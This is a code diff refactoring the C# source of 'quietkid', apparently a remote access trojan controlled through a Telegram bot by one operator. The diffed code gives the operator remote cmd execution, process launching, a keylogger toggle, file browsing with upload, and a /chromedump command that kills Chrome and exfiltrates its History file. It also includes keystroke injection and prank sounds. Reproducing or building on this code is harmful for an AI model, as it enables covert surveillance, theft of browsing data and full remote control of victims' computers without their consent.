@@ -36,6 +36,7 @@ namespace quietkid
     }
     public class Action
     {
+
         static string projectVersion;
         static string keyLog = "";
         static bool isLogging = false;
@@ -43,6 +44,7 @@ namespace quietkid
         private static TelegramBotClient Bot;
         private static Data.ConversationStatus status = Data.ConversationStatus.awaiting;
         static Stopwatch watch = Stopwatch.StartNew();
+
         [STAThread]
         static async Task Main()
         {
@@ -71,27 +73,218 @@ namespace quietkid
             }
             while (true) ;
         }
+
         private static async void BotOnMessageReceived(object sender, MessageEventArgs messageEventArgs)
         {
             var message = messageEventArgs.Message;
             if (message == null || message.Type != MessageType.Text || message.Chat.Id != Secure.me)
                 return;
+            await HandleMessageText(message.Text);
+        }
 
-            switch (message.Text)
+        static async Task PerformCommand(string command)
+        {
+            try
+            {
+                switch (status)
+                {
+                    case Data.ConversationStatus.ascii:
+                        if (command == "list")
+                        {
+                            await Bot.SendTextMessageAsync(
+                                chatId: Secure.me,
+                                 text: "shrek, toucan, patrick, patrickBack, amogus, deez, putin, hacking, sus"
+                            );
+                            break;
+                        }
+                        switch (command)
+                        {
+                            case "shrek":
+                                InsertPlain(ASCII.Shrek);
+                                break;
+                            case "toucan":
+                                InsertPlain(ASCII.Toucan);
+                                break;
+                            case "patrick":
+                                InsertPlain(ASCII.Patrick);
+                                break;
+                            case "patrickBack":
+                                InsertPlain(ASCII.PatrickIsBack);
+                                break;
+                            case "amogus":
+                                InsertPlain(ASCII.Amogus);
+                                break;
+                            case "deez":
+                                InsertPlain(ASCII.DeezNuts);
+                                break;
+                            case "putin":
+                                InsertPlain(ASCII.Putin);
+                                break;
+                            case "hacking":
+                                InsertPlain(ASCII.Hacking);
+                                break;
+                            case "sus":
+                                InsertPlain(ASCII.Sus);
+                                break;
+                            default:
+                                throw new Exception("Unknown ascii");
+                        }
+                        break;
+                    case Data.ConversationStatus.sound:
+                        // TODO:
+                        // Resource list with all strings
+                        if (command == "list")
+                        {
+                            await Bot.SendTextMessageAsync(
+                                chatId: Secure.me,
+                                 text: "amogus, fart, aaaa, bomb, boom, bruh, error, hehe, woo"
+                            );
+                            break;
+                        }
+                        SoundPlayer audio = new SoundPlayer();
+                        switch (command)
+                        {
+                            case "amogus":
+                                audio = new SoundPlayer(Sounds.Sus);
+                                break;
+                            case "fart":
+                                audio = new SoundPlayer(Sounds.Fart);
+                                break;
+                            case "aaaa":
+                                audio = new SoundPlayer(Sounds.Aaaa);
+                                break;
+                            case "bomb":
+                                audio = new SoundPlayer(Sounds.Bomb);
+                                break;
+                            case "boom":
+                                audio = new SoundPlayer(Sounds.Boom);
+                                break;
+                            case "bruh":
+                                audio = new SoundPlayer(Sounds.Bruh);
+                                break;
+                            case "error":
+                                audio = new SoundPlayer(Sounds.Error);
+                                break;
+                            case "hehe":
+                                audio = new SoundPlayer(Sounds.Hehe);
+                                break;
+                            case "woo":
+                                audio = new SoundPlayer(Sounds.Woo);
+                                break;
+                            default:
+                                throw new Exception("Unknown sound");
+                        }
+                        audio.Play();
+                        break;
+                    case Data.ConversationStatus.webload:
+                        ProcessStartInfo prc = new ProcessStartInfo("cmd", @"/c start http://" + command);
+                        Process.Start(prc);
+                        break;
+                    case Data.ConversationStatus.plain:
+                        InsertPlain(command);
+                        break;
+                    case Data.ConversationStatus.spam:
+                        for (int i = 0; i < 20; i++)
+                        {
+                            InsertPlain(command + "\n");
+                        }
+                        break;
+                    case Data.ConversationStatus.finder:
+                        if (command == "U")
+                        {
+                            currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                            await DirDump();
+                        }
+                        else if (command == "B")
+                        {
+                            var dir = currentDir.Split(Path.DirectorySeparatorChar).ToList();
+                            dir.RemoveAt(dir.Count - 1);
+                            currentDir = string.Join(@"\", dir);
+                            await DirDump();
+                        }
+                        else if (command.Contains("S"))
+                        {
+                            string disk = command.Replace("S", "");
+                            currentDir = $@"{disk}:\\";
+                            await DirDump();
+                        }
+                        else if (int.TryParse(command, out int a))
+                        {
+                            await DirSwitch(a);
+                        }
+                        else
+                        {
+                            currentDir = command;
+                            await DirSwitch(currentDir);
+                        }
+                        break;
+                    case Data.ConversationStatus.shell:
+                        ShellExec(command);
+                        break;
+                    case Data.ConversationStatus.process:
+                        Process.Start(command);
+                        break;
+                    default:
+                        await Bot.SendTextMessageAsync(
+                           chatId: Secure.me,
+                           text: "!! Unknown"
+                        );
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                await ReportException(ex);
+            }
+        }
+
+        static void ShellExec(string arg)
+        {
+            ProcessStartInfo prcss = new ProcessStartInfo("cmd", @"/c " + arg);
+            Process.Start(prcss);
+        }
+
+        static async Task SwitchConversationStatus(Data.ConversationStatus to)
+        {
+            if (to != status)
+            {
+                await Bot.SendTextMessageAsync(
+                    chatId: Secure.me,
+                    text: $"Now in {to} mode."
+                );
+                status = to;
+            }
+            else
+            {
+                await Bot.SendTextMessageAsync(
+                    chatId: Secure.me,
+                    text: $"!! Already {to}."
+                );
+            }
+        }
+
+        static void InsertPlain(string keys)
+        {
+            SendKeys.SendWait(keys);
+        }
+
+        static async Task HandleMessageText(string messageText)
+        {
+            switch (messageText)
             {
                 case "/volup":
                     Process.Start("sndvol");
                     await Task.Delay(1000);
-                    await InsertPlain("+{TAB}{TAB}{PGUP}{PGUP}{PGUP}{PGUP}{PGUP}%{F4}");
+                    InsertPlain("+{TAB}{TAB}{PGUP}{PGUP}{PGUP}{PGUP}{PGUP}%{F4}");
                     break;
                 case "/sound":
-                    await Switch(Data.ConversationStatus.sound);
+                    await SwitchConversationStatus(Data.ConversationStatus.sound);
                     break;
                 case "/ascii":
-                    await Switch(Data.ConversationStatus.ascii);
+                    await SwitchConversationStatus(Data.ConversationStatus.ascii);
                     break;
                 case "/proc":
-                    await Switch(Data.ConversationStatus.process);
+                    await SwitchConversationStatus(Data.ConversationStatus.process);
                     break;
                 case "/basic":
                     await Bot.SendTextMessageAsync(
@@ -101,10 +294,10 @@ namespace quietkid
                     break;
                 case "/finder":
                     currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\";
-                    await Switch(Data.ConversationStatus.finder);
+                    await SwitchConversationStatus(Data.ConversationStatus.finder);
                     break;
                 case "/shell":
-                    await Switch(Data.ConversationStatus.shell);
+                    await SwitchConversationStatus(Data.ConversationStatus.shell);
                     break;
                 case "/hook":
                     isLogging = !isLogging;
@@ -129,25 +322,25 @@ namespace quietkid
                     keyLog = "";
                     break;
                 case "/close":
-                    await InsertPlain("%{F4}");
+                    InsertPlain("%{F4}");
                     break;
                 case "/chromedump":
-                    await ShellExec("taskkill /f /t /im chrome.exe");
+                    ShellExec("taskkill /f /t /im chrome.exe");
                     Thread.Sleep(1000);
                     await SendDocument($@"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\History");
                     break;
                 case "/plain":
-                    await Switch(Data.ConversationStatus.plain);
+                    await SwitchConversationStatus(Data.ConversationStatus.plain);
                     break;
                 case "/rep":
-                    await Switch(Data.ConversationStatus.spam);
+                    await SwitchConversationStatus(Data.ConversationStatus.spam);
                     break;
                 case "/webload":
-                    await Switch(Data.ConversationStatus.webload);
+                    await SwitchConversationStatus(Data.ConversationStatus.webload);
                     break;
                 case "/wipe":
-                    await InsertPlain("^a");
-                    await InsertPlain("{BS}");
+                    InsertPlain("^a");
+                    InsertPlain("{BS}");
                     break;
                 case "/kill":
                     await Bot.SendTextMessageAsync(
@@ -169,196 +362,11 @@ namespace quietkid
                     Environment.Exit(0);
                     break;
                 default:
-                    await Perform();
+                    await PerformCommand(messageText);
                     break;
             }
-
-            async Task Perform()
-            {
-                try
-                {
-                    switch (status)
-                    {
-                        case Data.ConversationStatus.ascii:
-                            if (message.Text == "list")
-                            {
-                                await Bot.SendTextMessageAsync(
-                                    chatId: Secure.me,
-                                     text: "shrek, toucan, patrick, patrickBack, amogus, deez, putin, hacking, sus"
-                                );
-                                break;
-                            }
-                            switch (message.Text)
-                            {
-                                case "shrek":
-                                    await InsertPlain(ASCII.Shrek);
-                                    break;
-                                case "toucan":
-                                    await InsertPlain(ASCII.Toucan);
-                                    break;
-                                case "patrick":
-                                    await InsertPlain(ASCII.Patrick);
-                                    break;
-                                case "patrickBack":
-                                    await InsertPlain(ASCII.PatrickIsBack);
-                                    break;
-                                case "amogus":
-                                    await InsertPlain(ASCII.Amogus);
-                                    break;
-                                case "deez":
-                                    await InsertPlain(ASCII.DeezNuts);
-                                    break;
-                                case "putin":
-                                    await InsertPlain(ASCII.Putin);
-                                    break;
-                                case "hacking":
-                                    await InsertPlain(ASCII.Hacking);
-                                    break;
-                                case "sus":
-                                    await InsertPlain(ASCII.Sus);
-                                    break;
-                                default:
-                                    throw new Exception("Unknown ascii");
-                            }
-                            break;
-                        case Data.ConversationStatus.sound:
-                            // TODO:
-                            // Resource list with all strings
-                            if (message.Text == "list")
-                            {
-                                await Bot.SendTextMessageAsync (
-                                    chatId: Secure.me,
-                                     text: "amogus, fart, aaaa, bomb, boom, bruh, error, hehe, woo"
-                                );
-                                break;
-                            }
-                            SoundPlayer audio = new SoundPlayer();
-                            switch (message.Text)
-                            {
-                                case "amogus":
-                                    audio = new SoundPlayer(Sounds.Sus);
-                                    break;
-                                case "fart":
-                                    audio = new SoundPlayer(Sounds.Fart);
-                                    break;
-                                case "aaaa":
-                                    audio = new SoundPlayer(Sounds.Aaaa);
-                                    break;
-                                case "bomb":
-                                    audio = new SoundPlayer(Sounds.Bomb);
-                                    break;
-                                case "boom":
-                                    audio = new SoundPlayer(Sounds.Boom);
-                                    break;
-                                case "bruh":
-                                    audio = new SoundPlayer(Sounds.Bruh);
-                                    break;
-                                case "error":
-                                    audio = new SoundPlayer(Sounds.Error);
-                                    break;
-                                case "hehe":
-                                    audio = new SoundPlayer(Sounds.Hehe);
-                                    break;
-                                case "woo":
-                                    audio = new SoundPlayer(Sounds.Woo);
-                                    break;
-                                default:
-                                    throw new Exception("Unknown sound");
-                            }
-                            audio.Play();
-                            break;
-                        case Data.ConversationStatus.webload:
-                            ProcessStartInfo prc = new ProcessStartInfo("cmd", @"/c start http://" + message.Text);
-                            Process.Start(prc);
-                            break;
-                        case Data.ConversationStatus.plain:
-                            await InsertPlain(message.Text);
-                            break;
-                        case Data.ConversationStatus.spam:
-                            for (int i = 0; i < 20; i++)
-                            {
-                                await InsertPlain(message.Text + "\n");
-                            }
-                            break;
-                        case Data.ConversationStatus.finder:
-                            if (message.Text == "U")
-                            {
-                                currentDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                                await DirDump();
-                            }
-                            else if (message.Text == "B")
-                            {
-                                var dir = currentDir.Split(Path.DirectorySeparatorChar).ToList();
-                                dir.RemoveAt(dir.Count - 1);
-                                currentDir = string.Join(@"\", dir);
-                                await DirDump();
-                            }
-                            else if (message.Text.Contains("S"))
-                            {
-                                string disk = message.Text.Replace("S", "");
-                                currentDir = $@"{disk}:\\";
-                                await DirDump();
-                            }
-                            else if (int.TryParse(message.Text, out int a))
-                            {
-                                await DirSwitch(a);
-                            }
-                            else
-                            {
-                                currentDir = message.Text;
-                                await DirSwitch(currentDir);
-                            }
-                            break;
-                        case Data.ConversationStatus.shell:
-                            await ShellExec(message.Text);
-                            break;
-                        case Data.ConversationStatus.process:
-                            Process.Start(message.Text);
-                            break;
-                        default:
-                            await Bot.SendTextMessageAsync(
-                               chatId: Secure.me,
-                               text: "!! Unknown"
-                            );
-                            break;
-                    }
-                }
-                catch (Exception ex)
-                {
-                    await ReportException(ex);
-                }
-            }
-
-            async Task ShellExec(string arg)
-            {
-                ProcessStartInfo prcss = new ProcessStartInfo("cmd", @"/c " + arg);
-                Process.Start(prcss);
-            }
-
-            async Task Switch(Data.ConversationStatus to)
-            {
-                if (to != status)
-                {
-                    await Bot.SendTextMessageAsync(
-                        chatId: Secure.me,
-                        text: $"Now in {to} mode."
-                    );
-                    status = to;
-                }
-                else
-                {
-                    await Bot.SendTextMessageAsync(
-                        chatId: Secure.me,
-                        text: $"!! Already {to}."
-                    );
-                }
-            }
-
-            async Task InsertPlain(string keys)
-            {
-                SendKeys.SendWait(keys);
-            }
         }
+
         static async Task Awake()
         {
             await Bot.SendTextMessageAsync(
@@ -366,6 +374,7 @@ namespace quietkid
                 text: $"Machine {Environment.MachineName} ruled by {Environment.UserName} is now online"
             );
         }
+
         static async Task ReportException(Exception ex)
         {
             await Bot.SendTextMessageAsync(
@@ -470,6 +479,7 @@ namespace quietkid
                 await SendDocument(to);
             }
         }
+
         private static void BotOnReceiveError(object sender, ReceiveErrorEventArgs receiveErrorEventArgs)
         {
             Bot.SendTextMessageAsync(
